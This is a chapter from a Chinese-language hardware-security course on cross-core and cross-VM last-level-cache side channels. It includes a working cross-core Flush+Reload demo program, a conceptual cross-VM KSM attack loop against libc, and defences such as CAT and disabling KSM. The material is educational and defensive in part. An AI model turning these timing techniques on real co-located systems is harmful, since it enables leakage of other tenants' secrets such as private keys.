# Ch 12 — 跨核心/跨 VM 的 LLC 攻擊

> **目標**：把 Flush+Reload 的威脅模型從「同行程」推進到「跨核心」再到「跨 VM 的雲端多租戶」場景，搞清楚 inclusive LLC 為何是這一切的關鍵，以及為什麼現代 CPU 和雲端平台讓這件事愈來愈難。

---

Part 2 的前十一章都在同一個行程內打 cache 側通道——攻擊者和 victim 共享同一個 address space，觀察自己的存取時序就能洩漏秘密。這個假設非常寬鬆，現實不一定成立。

本章把威脅模型推到邊界：

- 攻擊者和 victim 是**不同行程**，跑在**不同實體核心**
- 攻擊者和 victim 是**不同 VM**，跑在同一個實體 CPU 的不同虛擬化環境

這才是雲端多租戶的現實。弄清楚為什麼攻擊仍然可行（以及何時不再可行），比會寫 POC 更重要。

---

## 從單核到多核：威脅模型的擴展

先整理一下威脅模型的階梯：

| 場景 | 攻擊者 / victim 關係 | 共享資源 | 章節 |
|------|---------------------|---------|------|
| 同行程 | 同一個 address space | L1/L2/LLC 全共享 | Ch 6–11 |
| 跨行程（同機器） | 不同 VA space，可能共享 physical page（shared lib） | LLC 共享 | Ch 12（本章前半） |
| 跨核心（同 socket） | 不同核心，不共享 L1/L2 | LLC 共享 | Ch 12（本章前半） |
| 跨 VM（同 host） | 不同 hypervisor guest | LLC 共享（透過 host） | Ch 12（本章後半）|
| 跨 socket | 不同 NUMA node | 各自 LLC，QPI/UPI 互連 | 不在本課範圍 |

本章聚焦中間兩層：**跨核心**和**跨 VM**。

---

## Inclusive LLC：為什麼跨核心 eviction 能傳播

Intel 傳統的 LLC 設計是 **inclusive**：L3 包含 L1 和 L2 裡的所有 cache line。用反向來理解比較直覺：

> 一條 cache line 在 L1/L2 裡 → 它必然也在 L3 裡。

這個 inclusive 不變式的代價是顯然的（L3 要留一份備份），但它帶來一個對攻擊者非常有用的副作用：

**從 LLC 踢出一條 cache line，也會連帶踢出所有核心的 L1 和 L2。**

```
Core 0 (attacker, HT thread 0)       LLC（所有核心共享）       Core 1 (victim)
┌────────────────────────────┐        ┌─────────────────┐       ┌──────────────────────────┐
│  clflush(target_addr)      │──────► │  line evicted   │─────► │  L1/L2 也被連帶踢出！    │
│                            │        │  from all sets  │       │                          │
│  等 victim 存取 target_addr │        │                 │       │  victim 下次存取          │
│                            │        │                 │       │  從 DRAM 填充 LLC        │
│  reload(target_addr)       │──────► │  LLC HIT        │       │                          │
│  → ~50 cycles              │◄───────│  ~50 cycles     │       │                          │
└────────────────────────────┘        └─────────────────┘       └──────────────────────────┘
```

這個攻擊之所以可行，需要攻擊者和 victim 都映射到**同一個 physical page**——可以透過 shared library（libc.so、libssl.so 等）或 mmap 同一個檔案實現。Virtual address 不同沒關係，只要最終指向同一個 physical frame，LLC 裡只有一條 cache line。

**Comet Lake i7-10700 的 LLC 架構**：
- 8 核心，16 MiB LLC，分成多個 LLC slice（每個核心大約對應一個 slice）
- LLC 是 inclusive，16 路組相聯
- 所有核心的 L1/L2 eviction 都由 LLC 的 inclusive 不變式管理

---

## 真跑：跨核心 Flush+Reload（同一台機器）

這個 demo 用兩個行程模擬攻擊者和 victim：父行程（attacker）pin 到 core 0，子行程（victim）pin 到 core 2；兩者 mmap 同一個檔案，共享同一個 physical page。

完整程式碼 `cross_core_fr.c`：

```c
/*
 * cross_core_fr.c — 跨核心 Flush+Reload 示範
 *
 * 編譯：gcc -O0 cross_core_fr.c -o cross_core_fr
 * 執行：./cross_core_fr
 * （不需要 taskset，程式內部透過 sched_setaffinity 綁核心）
 *
 * 需求：一個可 mmap 的共享檔案（程式會自動建立 /tmp/fr_shared）
 * 環境：Linux，Intel inclusive LLC
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sched.h>
#include <time.h>
#include <sys/wait.h>

#define CACHE_HIT_THRESHOLD 150
#define SHARED_FILE         "/tmp/fr_shared"
#define PAGE_SIZE           4096
#define SYNC_ROUNDS         10

/* --- rdtsc 計時 --- */
static inline uint64_t rdtsc_begin(void) {
    uint32_t lo, hi;
    __asm__ volatile (
        "mfence\n\t"
        "rdtsc\n\t"
        : "=a"(lo), "=d"(hi)
    );
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t rdtsc_end(void) {
    uint32_t lo, hi;
    __asm__ volatile (
        "rdtscp\n\t"
        "mfence\n\t"
        : "=a"(lo), "=d"(hi)
        :: "rcx"
    );
    return ((uint64_t)hi << 32) | lo;
}

/* --- clflush --- */
static inline void flush(volatile void *addr) {
    __asm__ volatile ("clflush (%0)" :: "r"(addr) : "memory");
}

/* --- 綁核心 --- */
static void pin_to_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

/* --- reload 計時 --- */
static uint64_t timed_reload(volatile uint8_t *addr) {
    uint64_t t0, t1;
    t0 = rdtsc_begin();
    (void)*addr;
    t1 = rdtsc_end();
    return t1 - t0;
}

int main(void) {
    /* 建立共享檔案 */
    int fd = open(SHARED_FILE, O_RDWR | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) { perror("open"); return 1; }
    if (ftruncate(fd, PAGE_SIZE) != 0) { perror("ftruncate"); return 1; }

    /* 父子行程都映射同一個檔案 → 同一個 physical page */
    volatile uint8_t *shared = mmap(NULL, PAGE_SIZE,
                                    PROT_READ | PROT_WRITE,
                                    MAP_SHARED, fd, 0);
    if (shared == MAP_FAILED) { perror("mmap"); return 1; }
    close(fd);

    /* 初始化共享記憶體 */
    memset((void *)shared, 0, PAGE_SIZE);

    /* pipe 做同步：attacker 通知 victim，victim 回覆 */
    int pipe_av[2], pipe_va[2];  /* av: attacker→victim, va: victim→attacker */
    if (pipe(pipe_av) || pipe(pipe_va)) { perror("pipe"); return 1; }

    pid_t child = fork();
    if (child < 0) { perror("fork"); return 1; }

    if (child == 0) {
        /* =========== 子行程：victim，pin 到 core 2 =========== */
        pin_to_core(2);
        close(pipe_av[1]);  /* 關掉 attacker→victim 的寫端 */
        close(pipe_va[0]);  /* 關掉 victim→attacker 的讀端 */

        char cmd;
        for (int round = 0; round < SYNC_ROUNDS; round++) {
            /* 等 attacker 發出命令 */
            if (read(pipe_av[0], &cmd, 1) != 1) break;

            if (cmd == 'A') {
                /* Round A：victim 確實存取 shared[0] */
                (void)shared[0];
            }
            /* Round B (cmd == 'B')：victim 不存取，什麼都不做 */

            /* 通知 attacker 完成 */
            char done = 'D';
            write(pipe_va[1], &done, 1);
        }

        close(pipe_av[0]);
        close(pipe_va[1]);
        munmap((void *)shared, PAGE_SIZE);
        exit(0);
    }

    /* =========== 父行程：attacker，pin 到 core 0 =========== */
    pin_to_core(0);
    close(pipe_av[0]);  /* 關掉 attacker→victim 的讀端 */
    close(pipe_va[1]);  /* 關掉 victim→attacker 的寫端 */

    printf("[attacker] 跨核心 Flush+Reload 實驗開始\n");
    printf("[attacker] attacker: core 0 | victim: core 2\n");
    printf("[attacker] CACHE_HIT_THRESHOLD = %d cycles\n\n", CACHE_HIT_THRESHOLD);

    for (int round = 0; round < SYNC_ROUNDS; round++) {
        /* Step 1：flush 目標 cache line */
        flush(shared);
        __asm__ volatile ("mfence" ::: "memory");

        char cmd, done;
        uint64_t t;

        /* ---- Round A：victim 會存取 ---- */
        cmd = 'A';
        write(pipe_av[1], &cmd, 1);
        /* 等 victim 完成存取 */
        if (read(pipe_va[0], &done, 1) != 1) break;

        /* Step 2：reload 計時 */
        t = timed_reload(shared);
        printf("[Round %2d-A] victim 有存取   -> reload: %4lu cycles (%s)\n",
               round, t, t < CACHE_HIT_THRESHOLD ? "HIT  <--" : "MISS");

        /* ---- 清場，重新 flush ---- */
        flush(shared);
        __asm__ volatile ("mfence" ::: "memory");

        /* ---- Round B：victim 不存取 ---- */
        cmd = 'B';
        write(pipe_av[1], &cmd, 1);
        if (read(pipe_va[0], &done, 1) != 1) break;

        t = timed_reload(shared);
        printf("[Round %2d-B] victim 未存取   -> reload: %4lu cycles (%s)\n\n",
               round, t, t < CACHE_HIT_THRESHOLD ? "HIT" : "MISS <--");
    }

    close(pipe_av[1]);
    close(pipe_va[0]);
    wait(NULL);
    munmap((void *)shared, PAGE_SIZE);
    unlink(SHARED_FILE);

    printf("[attacker] 實驗結束\n");
    return 0;
}
```

**編譯與執行**：
```bash
gcc -O0 cross_core_fr.c -o cross_core_fr
./cross_core_fr
```

不需要 `taskset`，程式內部已用 `sched_setaffinity` 綁核心（attacker → core 0，victim → core 2）。若系統有超執行緒，core 0 和 core 1 是同一個 physical core 的兩個邏輯核心，選 core 2 確保 attacker 和 victim 在不同 physical core。

**預期輸出**（Comet Lake i7-10700）：
```
[attacker] 跨核心 Flush+Reload 實驗開始
[attacker] attacker: core 0 | victim: core 2
[attacker] CACHE_HIT_THRESHOLD = 150 cycles

[Round  0-A] victim 有存取   -> reload:   52 cycles (HIT  <--)
[Round  0-B] victim 未存取   -> reload:  244 cycles (MISS <--)

[Round  1-A] victim 有存取   -> reload:   48 cycles (HIT  <--)
[Round  1-B] victim 未存取   -> reload:  238 cycles (MISS <--)
...
```

**為什麼 A rounds 是 HIT**：
1. `clflush` 把 `shared[0]` 的 cache line 從整個 LLC 踢出（inclusive LLC 廣播到所有核心的 L1/L2）
2. victim（core 2）存取 `shared[0]`，觸發 LLC fill——physical page 被抓進 LLC
3. attacker（core 0）做 reload，LLC 有資料，命中，~50 cycles

**為什麼 B rounds 是 MISS**：
1. `clflush` 同樣踢出 cache line
2. victim 不存取，LLC 維持空
3. attacker reload 時 LLC miss，需要去 DRAM，~240 cycles

這個實驗的關鍵：**兩個行程有不同的虛擬地址，但映射到同一個 physical page，LLC 只有一條 cache line**。inclusive LLC 保證 clflush 影響所有核心。

---

## AMD vs Intel：inclusive vs non-inclusive 的差異

LLC 的 inclusive 性質不是所有 CPU 的標配。這直接決定跨核心攻擊的可行性。

### Intel 的演進

| 世代 | 代表型號 | LLC 設計 | 跨核心 clflush 傳播 |
|------|---------|---------|-------------------|
| Sandy Bridge 到 Comet Lake（本課）| i7-10700 | Inclusive | 是 |
| Alder Lake（12th Gen）之後 | i9-12900K | Non-inclusive（mixed） | 部分否 |
| Sapphire Rapids（伺服器）| Xeon 4th Gen | Non-inclusive | 否 |

Intel 從 12th Gen 開始把 LLC 改成 non-inclusive 設計（又稱「non-inclusive victim cache」或「mid-level cache」）。理由是 inclusive 的空間浪費太大——每條 L1/L2 的 cache line 都要在 LLC 留一份備份。

Non-inclusive LLC 上，`clflush` 只從 L1/L2（本核心）和 LLC 踢出 cache line；**其他核心的 L1/L2 不受影響**。這讓跨核心 F+R 困難許多——victim 的 L1 命中，你永遠偵測不到。

### AMD 的情況

AMD Zen 系列（Zen 1 之後）的 LLC 是 **non-inclusive**（有時稱為 victim cache 模式）：L3 存放從 L2 被踢出的 line，不主動備份 L1/L2 的內容。

- `clflush` 踢出 L1（本核心）和 LLC，但不踢其他核心的 L1/L2
- 跨核心 F+R 難以直接實作
- Prime+Probe 在 LLC 仍可行（LLC 仍是所有核心共享），但 eviction set 更難構建

**結論**：本章所有「跨核心 F+R 可行」的論述**只適用於 Intel Comet Lake 和更早的 inclusive LLC 架構**。在新 Intel 和 AMD 上，需要其他技術（P+P 或更複雜的 eviction set）。

---

## 雲端威脅模型：攻擊者與 victim 在不同 VM

> **未實測，理論預期**——雲端 co-location 攻擊需要特殊環境，本課在本機 WSL2 無法直接驗證。

### 雲端 IaaS 的 CPU 共享現實

AWS EC2、GCP Compute Engine、Azure VM 都在同一個實體 host 跑多個 VM。典型的 x86 伺服器有 2 個 socket，每個 socket 有 24–64 個核心，hypervisor（KVM 或 VMware）把這些核心分配給不同的 tenant VM。

```
實體 Host（Intel Xeon）
├── Socket 0
│   ├── LLC（所有 socket 0 的核心共享）
│   ├── VM-A（attacker，8 vCPU → 8 physical cores）
│   └── VM-B（victim，8 vCPU → 8 physical cores）
└── Socket 1
    └── VM-C（另一個 tenant，跨 socket，不共享 LLC）
```

如果 attacker VM 和 victim VM 被 hypervisor 調度到**同一個 socket 的核心**，它們共享 LLC。這是 co-location（共置）。

**攻擊者如何確認 co-location**：
- 對一段高延遲的 probe sequence 計時——如果看到 LLC 級別的延遲而非 DRAM 延遲，可能與 victim 共置
- 這本身就是一個時序推斷問題，不精確但有統計意義

---

## KSM：共享 physical page 讓 F+R 跨 VM

> **未實測，理論預期**

跨 VM 的 Flush+Reload 需要攻擊者和 victim **映射到同一個 physical page**。兩個 VM 有各自的 physical address space（SLAT/EPT 分開），正常情況下不會共享。

這個缺口由 **KSM（Kernel Samepage Merging）** 填補。

### KSM 工作原理

KSM 是 Linux 的記憶體去重複（memory deduplication）機制，原始動機是減少 KVM 環境的記憶體用量：

```
VM-A 的 guest physical memory          VM-B 的 guest physical memory
┌─────────────────────────┐            ┌─────────────────────────┐
│  GPA 0x7f000 → HPA X   │            │  GPA 0x8a000 → HPA Y   │
│  內容：libc.so text      │            │  內容：libc.so text（同）│
└─────────────────────────┘            └─────────────────────────┘
             │                                      │
             ▼  KSM 掃描，發現內容相同               ▼
             └──────────► HPA X（合併後）◄───────────┘
                          VM-A 和 VM-B 的對應 GPA
                          現在都指向同一個 HPA
```

KSM 的背景執行緒（`ksmd`）定期掃描 anonymous pages，對內容做雜湊，找相同的 page 合併成一個 CoW（Copy-on-Write）shared page。如果兩個 VM 都載入了 libc.so 的相同版本，這些 text section pages 會被 KSM 合併。

**確認 KSM 啟用**（在 host 上執行）：
```bash
cat /sys/kernel/mm/ksm/run          # 1 = 啟用
cat /sys/kernel/mm/ksm/pages_shared # 已合併的 page 數量
cat /sys/kernel/mm/ksm/pages_sharing # 有幾個 VA 指向這些共享 pages
```

**KSM 合併後，F+R 跨 VM 的邏輯**：

1. attacker VM 找到 libc.so 在自己 guest memory 裡的位址，等 KSM 合併
2. 一旦合併，attacker 的 `clflush(libc_addr)` 作用在 HPA X 上，連帶踢出 victim VM 的對應 L1/L2 cache line
3. victim 的 libc 函數呼叫觸發 LLC fill
4. attacker 的 reload 看到 HIT → 知道 victim 存取了那個 page/cache line

這正是 Yarom & Falkner 2014（FLUSH+RELOAD 原始論文）在 VMware Workstation 上展示的攻擊。

---

## 重現跨 VM 攻擊的條件與步驟

> **未實測，理論預期。以下條件清單基於文獻，未在本課環境驗證。**

### 必要條件

1. **Co-location 確認**：attacker VM 和 victim VM 在同一個實體 CPU socket。可用 LLC 延遲探測（LLC hit < 100 cycles，DRAM hit > 200 cycles）做統計推斷，但不精確。

2. **KSM 啟用且合併了目標 page**：
   ```bash
   # host 端
   echo 1 > /sys/kernel/mm/ksm/run
   # 等待 ksmd 跑幾輪後確認
   cat /sys/kernel/mm/ksm/pages_shared
   ```
   在雲端環境，這個需要 host 管理員開啟，tenant 無法控制。

3. **找到合適的 shared library**：目標必須是兩個 VM 都載入、且 KSM 已合併的 library。通常 libc.so.6 是首選，因為幾乎所有行程都載入它，且版本容易相同。

4. **Inclusive LLC**：host CPU 必須是 inclusive LLC 的型號（Intel Comet Lake 之前）。

### 操作步驟（概念性）

```
# attacker VM 內部
1. 找到 libc.so 在自己 address space 的基底地址：
   grep libc /proc/self/maps

2. 選擇目標函數的偏移（例如 memcpy）：
   objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep "<memcpy>"

3. 等待 KSM 合併（可觀察 /proc/self/pagemap 的 pfn 變化，
   合併後 pfn 會改變成 shared page 的 pfn）

4. 對目標 cache line 做 F+R 迴圈：
   while (1) {
       clflush(libc_target);
       // 等待足夠時間讓 victim 可能呼叫 memcpy
       for (int i = 0; i < 1000; i++) __asm__ volatile ("nop");
       t = timed_reload(libc_target);
       if (t < THRESHOLD) {
           printf("victim called memcpy at timestamp %lu\n", rdtsc());
       }
   }
```

### 不需要 KSM 的替代方案：Prime+Probe 跨 VM

即使沒有 KSM，Prime+Probe 在 LLC 層級仍然可行，因為 P+P 只需要**同一個 cache set**有衝突，不需要共享 physical page。

攻擊者在自己的 VM 裡建構 LLC eviction set（方法見 Ch 9）：找一組在同一個 LLC set 裡的 attacker-controlled addresses，用這組 addresses prime 填滿那個 cache set，然後觀察 victim（在另一個 VM）存取是否踢走某些 attacker 的 lines。

這正是 Liu et al. 2015（LLC Side-Channel Attacks are Practical）和 Zhang et al. 2012（Cross-VM Private Key Extraction）的方法。P+P 跨 VM 不需要共享記憶體，但雜訊更大，需要更多統計處理。

---

## 為什麼今日跨 VM 攻擊更難：防禦現況

現實是這些攻擊在 2012–2015 年相對容易，現在更難了。以下是防禦層次：

### 硬體層次

**Non-inclusive LLC**：Intel 12th Gen 之後、AMD Zen 系列全線。clflush 不再跨核心傳播，跨核心 F+R 直接失效。Prime+Probe 仍可行但更難。

**Cache Allocation Technology（CAT）**：Intel 的 RDT（Resource Director Technology）允許 hypervisor 把 LLC 劃分成不同 partition，分配給不同 VM。VM-A 只能用 LLC 的前 8 MiB，VM-B 只能用後 8 MiB，不重疊就沒有共享 cache set，P+P 跨 VM 失效。

**CAT 配置示例**（host 端，需要 root）：
```bash
# 用 pqos 工具配置 Intel CAT
pqos -e "llc:0=0x00ff"   # COS 0 只用低 8 ways
pqos -e "llc:1=0xff00"   # COS 1 只用高 8 ways
pqos -a "llc:0=<VM-A vCPU list>"
pqos -a "llc:1=<VM-B vCPU list>"
```

### 軟體/Hypervisor 層次

**KSM 預設關閉**：AWS EC2 等主要雲端供應商因為 Flush+Reload 攻擊的曝光，已把 KSM 預設關閉。沒有 KSM 就沒有跨 VM 的共享 physical page，F+R 跨 VM 失效。

**Co-location 防禦**：一些雲端供應商部署了「tenancy isolation」保證，付費方案確保 VM 不與其他 tenant 共置（AWS dedicated instances）。

**Noise injection**：在計時器精度上做手腳——降低 `rdtsc` 精度或在 VM 裡回傳加了隨機雜訊的時間戳，讓側通道計時無法區分 HIT 和 MISS。

### 仍然有效的場景

儘管如此，以下情況在 2024–2026 年仍值得關注：

- **SMT（超執行緒）**：同一個 physical core 的兩個邏輯核心共享 L1D cache，不需要 LLC inclusive，攻擊仍有效（Ch 26 會深挖 SMT 攻擊）
- **舊版雲端機器**：不是所有 cloud instance 都跑在最新 CPU 上，舊型 Skylake/Cascade Lake 機器仍有 inclusive LLC
- **沒開 RDT/CAT 的環境**：許多私有雲或企業 KVM 環境沒有配置 CAT
- **P+P 的持續有效性**：只要 LLC 在核心間共享（無論是否 inclusive），P+P 都有某種程度的效果

---

## 對比與取捨

| 攻擊方式 | 場景 | 需要共享記憶體 | 雜訊 | 適用 CPU | 可行性（2025） |
|---------|------|--------------|------|---------|-------------|
| F+R，同行程 | 同 address space | 不需要（直接訪問） | 極低 | 所有 | 高 |
| F+R，跨行程（同 OS） | 不同行程，shared lib | 需要 shared physical page | 低 | Inclusive LLC | 高 |
| F+R，跨核心（同 OS） | 不同 core，shared lib | 需要 shared physical page | 低–中 | Inclusive LLC | 高（舊 Intel） |
| F+R，跨 VM（KSM） | 不同 VM，KSM 合併 | 需要 KSM 合併 | 中 | Inclusive LLC | 低（KSM 常關） |
| P+P，跨核心（同 OS） | 不同 core，eviction set | 不需要 | 中 | 所有 | 高 |
| P+P，跨 VM | 不同 VM，eviction set | 不需要 | 高 | 所有（LLC 共享） | 中 |
| F+R，同 core（SMT） | 同 physical core，HT | 需要 shared physical page | 極低 | Inclusive L1D | 高 |

**挑選策略**：如果可以獲得共享記憶體且 CPU 是 inclusive LLC，F+R 雜訊最低，優先選。如果沒有共享記憶體或 CPU 是 non-inclusive，P+P 是唯一選項，但需要 eviction set 構建和更多統計。

---

## 踩雷集錦

### 1. 忘記等 KSM 合併就開始攻擊

KSM 不是瞬間運作的。ksmd 背景執行緒預設每隔一段時間才掃描一輪，從 VM 啟動到目標 page 被合併可能要幾分鐘到幾十分鐘。如果攻擊者太早開始 F+R，看到的只是 MISS，誤以為 co-location 不成立。

**解法**：監控 `/sys/kernel/mm/ksm/pages_shared` 的增長，確認合併完成再開始攻擊。或在 host 端執行 `echo 200 > /sys/kernel/mm/ksm/pages_to_scan` 加快掃描速度。

### 2. 把 HT 對的 core 當成「跨 physical core」

`core 0` 和 `core 1` 在 Intel HT 機器上通常是同一個 physical core 的兩個邏輯核心（HT 對）。它們共享 L1D，攻擊效果和「跨 physical core」完全不同——HT 對之間甚至不需要 LLC hit，因為 L1D 是直接共享的。

**確認 core 拓撲**：
```bash
cat /sys/devices/system/cpu/cpu{0,1,2,3}/topology/core_id
# 0 0 1 1 → core0 和 core1 是 HT 對，core2 和 core3 是另一個 HT 對
```

### 3. 在 non-inclusive LLC 的機器上期望 clflush 跨核心傳播

在 Alder Lake（i9-12900K）或 AMD Zen 上跑這章的 cross_core_fr.c，Round A 的 reload 時間仍然會是 MISS，因為 victim 的存取填充了 victim 自己的 L1/L2，attacker 的 LLC slice 看不到。不是程式有 bug，是硬體架構不同。

**解法**：確認 CPU 型號，查 Intel ARK 或 AMD 規格確認 LLC inclusive/exclusive 設計。`lscpu | grep cache` 提供的資訊通常不夠，需要看架構文件或透過 CPUID 工具。

### 4. pipe 同步的延遲影響計時

parent（attacker）透過 pipe 等 child（victim）完成存取後再做 reload，pipe 的 read/write 有幾微秒到幾十微秒的延遲。在這段時間裡，victim 存取填進 LLC 的 cache line 可能已經被 attacker 自己的其他存取踢出（如果 LLC pressure 高）。

**解法**：victim 完成後立即通知，attacker 收到通知後立刻 reload，中間不做任何其他記憶體存取。本章的程式碼已有此設計，但在 cache pressure 大的系統上仍可能有噪音。

### 5. 雲端平台的計時器精度限制

現代 hypervisor 對 guest VM 的 `rdtsc` 回傳值有意加入抖動（VM-exit 計時補償），或把精度限制在毫秒層級。在這種環境下，~50 cycles vs ~240 cycles 的差異可能完全被抹平，側通道計時失效。

**解法**：在雲端環境嘗試前，先確認 `rdtsc` 精度——連續讀兩次 rdtsc 的差值，看是否 < 10 cycles。如果每次都是固定的大數字（幾千 cycles），代表計時器被虛擬化了，需要換其他測量手段（例如透過 performance counter 或 perf_event）。

---

## 進階：再往深一層

### LLC Slice 映射與位址選擇

Intel LLC 不是一個單一的 monolithic cache，而是分成多個 **slice**（每個核心大約對應一個 slice）。實體位址透過一個未公開的 hash function 映射到特定 slice。

跨核心 F+R 通常不受 slice 影響（flush 是廣播到所有 slice），但 Prime+Probe 需要攻擊者的 eviction set 和 victim 的目標 address 落在**同一個 LLC slice 的同一個 cache set**，選錯 slice 效果歸零。

Irazoqui et al. 2015（"S$A: A Shared Cache Attack"）展示了如何逆向 Intel 的 LLC hash function，是 P+P 跨核心實作的必要前置。

### DDIO（Data Direct I/O）與 PCIe 裝置的 LLC 攻擊

Intel 的 DDIO 讓 NIC/SSD 等 PCIe 裝置可以直接 DMA 到 LLC，繞過 DRAM。這創造了一個新的攻擊面：攻擊者可以透過網路封包（或 NVMe 讀寫）把資料注入 LLC 特定 cache set，對正在那個 set 做 P+P 的 victim 造成干擾，甚至遠端觸發 LLC eviction。

Tatar et al., "Throwhammer: Rowhammer Attacks over the Network and Defenses", USENIX ATC 2018 展示了這類遠端攻擊。

### Cross-VM Rowhammer

跨 VM 攻擊不只有 cache 側通道。如果 KSM 合併了 physical page，攻擊者對那個 physical page 大量讀寫可以觸發 DRAM rowhammer，翻轉 victim VM 的 page table 位元，直接實現跨 VM 的記憶體讀寫。這超出本課範圍，但和本章的跨 VM 模型緊密相關（Ch 22–24 討論 rowhammer）。

---

## 動手練習

**1. 確認你的 CPU 是否為 inclusive LLC**

```bash
# 方法一：透過 sysfs
cat /sys/devices/system/cpu/cpu0/cache/index3/type
# 方法二：CPUID 工具（若已安裝）
cpuid -l 4 | grep -i inclusive
# 方法三：Intel ARK 網站搜尋 CPU 型號
```

若是 Intel Comet Lake（i7-10700）：LLC 是 inclusive，本章程式碼預期正常運作。若是 12th Gen 以後或 AMD：clflush 跨核心不傳播，A rounds 會看到 MISS。

**2. 跑 cross_core_fr.c 並改變 core pair**

```bash
gcc -O0 cross_core_fr.c -o cross_core_fr
./cross_core_fr
```

然後修改程式碼，把 attacker 和 victim 的 core 改成 HT 對（例如 core 0 和 core 1），觀察 reload 時間。理論上 HT 對共享 L1D，HIT 的時間應該更低（20–30 cycles），因為根本不需要透過 LLC。

接著再改成跨 socket（如果你的機器有多個 socket），觀察時間是否更長（LLC miss 需要透過 QPI/UPI，可能 > 300 cycles）。

**3. 觀察 KSM 行為（在本機 Linux/WSL2 上）**

```bash
# 確認 KSM 是否有支援
ls /sys/kernel/mm/ksm/ 2>/dev/null && echo "KSM supported" || echo "no KSM"

# WSL2 通常沒有 KSM 支援，這個練習在原生 Linux 上做
# 如果有 KSM，啟用並觀察：
sudo echo 1 > /sys/kernel/mm/ksm/run
watch -n1 'cat /sys/kernel/mm/ksm/pages_shared /sys/kernel/mm/ksm/pages_sharing'
```

**4. 測量你的環境是否有計時器精度限制**

```c
/* timing_check.c */
#include <stdio.h>
#include <stdint.h>
static inline uint64_t rdtsc(void) {
    uint32_t lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}
int main(void) {
    for (int i = 0; i < 10; i++) {
        uint64_t a = rdtsc(), b = rdtsc();
        printf("consecutive rdtsc diff: %lu cycles\n", b - a);
    }
    return 0;
}
```

```bash
gcc -O0 timing_check.c -o timing_check && ./timing_check
```

差值 < 20 cycles：計時器正常，可以做 cache 側通道。差值 > 100 cycles 或固定大數字：計時器被虛擬化，側通道計時精度受限。

---

## 本章重點整理

1. **Inclusive LLC 是跨核心攻擊的根基**：Intel Comet Lake 及以前的 inclusive LLC 讓 `clflush` 從任何核心廣播，使跨核心 F+R 可行。

2. **跨核心 F+R 需要共享 physical page**：透過 shared library 或 mmap 同一個檔案，不同行程映射到同一個 physical page，LLC 只有一條 cache line，clflush 影響所有核心。

3. **跨 VM F+R 依賴 KSM**：KSM 把兩個 VM 的相同 physical page 合併，讓跨 VM F+R 成為可能。現代雲端環境多把 KSM 關閉。

4. **P+P 不需要共享記憶體**：只需要 eviction set 和 victim 的目標落在同一個 LLC cache set，可以跨核心和跨 VM 使用，但雜訊更高。

5. **Non-inclusive LLC 改變了攻擊格局**：Intel 12th Gen 之後和 AMD Zen 的 LLC 不是 inclusive，跨核心 F+R 直接失效，P+P 仍可行。

6. **CAT 和 KSM 關閉是主要防禦**：硬體 cache partitioning（CAT）和關閉 memory deduplication（KSM）是雲端環境最有效的緩解。

7. **SMT 仍是最強的攻擊面**：同一個 physical core 的 HT 執行緒共享 L1D，無論 LLC 是否 inclusive，攻擊效果都最強（Ch 26）。

---

## 自我檢核

完成本章後，你應該能回答：

- `clflush` 在 inclusive LLC 的 CPU 上對其他核心的 L1/L2 有什麼影響？為什麼？
- 跨核心 Flush+Reload 需要哪些前提條件？在本機如何驗證這些條件？
- KSM 是什麼，它如何讓跨 VM 的 F+R 成為可能？
- 為什麼在 Intel 12th Gen 或 AMD Zen 上，本章的 cross_core_fr.c 不會看到 HIT？
- Prime+Probe 跨 VM 和 Flush+Reload 跨 VM 的最大差異是什麼？各自的優缺點？
- 現代雲端環境對跨 VM cache 攻擊有哪些防禦？哪些場景仍然有效？

---

## 延伸閱讀

1. **Yarom & Falkner, "FLUSH+RELOAD: a High Resolution, Low Noise, L3 Cache Side-Channel Attack", USENIX Security 2014**
   — F+R 攻擊的原始論文。Section 6 專門討論跨 VM 場景，展示在 VMware Workstation 上透過 KSM 合併的 GnuPG 程式碼頁面做 F+R，洩漏 RSA private key。奠定本章所有討論的基礎。

2. **Irazoqui et al., "Cross Processor Cache Attacks", AsiaCCS 2016**
   — 跨核心和跨 VM cache 攻擊的系統化研究。深入分析不同 CPU 架構（Intel vs AMD）對跨核心攻擊可行性的影響，提出針對非 inclusive LLC 的 Prime+Probe 改良，以及 LLC slice 映射的逆向方法。

3. **Zhang et al., "Cross-VM Side Channels and Their Use to Extract Private Keys", CCS 2012**
   — 最早展示跨 VM 攻擊實際可行的論文之一。在 KVM 環境下用 Prime+Probe（不需要 KSM/共享記憶體）打 ElGamal 加密，成功提取 private key。展示了 P+P 在 LLC 跨 VM 的完整攻擊流程和統計分析方法。

4. **Liu et al., "Last-Level Cache Side-Channel Attacks are Practical", IEEE S&P 2015**
   — Prime+Probe 在 LLC 層級的完整實作，展示在不需要 root 權限、不需要共享記憶體的情況下，從跨行程（同 OS）和跨 VM（KVM）場景打 ElGamal 和 RSA。LLC eviction set 構建的詳細演算法，是 P+P 跨核心攻擊的必讀參考。

---

**Part 2（Ch 6–12）結束。**

Part 2 從最基礎的 rdtsc 計時（Ch 6）開始，建立 cache 側通道的完整工具箱：F+R、F+F、P+P 三大技術（Ch 6–10），打 AES T-table（Ch 11），最後把威脅模型從同行程推到跨核心、跨 VM（本章）。

Part 3 進入**瞬態執行攻擊（Transient Execution Attacks）**——Spectre 和 Meltdown。這類攻擊利用的不是正常的 cache 行為，而是 CPU 推測執行留下的 cache footprint。Part 2 建立的 F+R 和 P+P 工具，在 Part 3 搖身一變成為瞬態攻擊的「洩漏通道」。

→ [下一章：Ch 13 — 瞬態執行基礎：推測、Reorder Buffer 與 Cache 足跡](13-transient-execution-basics.md)
